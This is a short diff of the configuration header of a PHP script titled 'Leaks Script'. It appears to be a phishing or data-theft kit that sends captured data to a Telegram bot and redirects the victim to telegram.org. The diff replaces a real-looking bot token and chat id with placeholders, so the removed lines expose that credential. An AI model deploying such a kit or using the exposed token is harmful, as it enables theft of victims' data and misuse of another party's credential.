@@ -1,8 +1,8 @@
 <?php
 $redirect = "https://telegram.org";  //bisa diubah mau redirect kemana. contoh http://whatsapp.com/
 
-$token = "6869719197:AAEwLo3bCtb9C3BVkH0k1gZ94De484HHqxM"; //token bot telegram
-$chat_id = "1352631386"; //chat id
+$token = "00000000:XXXXXXXXXXXXXXXXXXXXXXX"; //token bot telegram
+$chat_id = "000000000"; //chat id
 
 /*
   Leaks Script by ./SansXpl
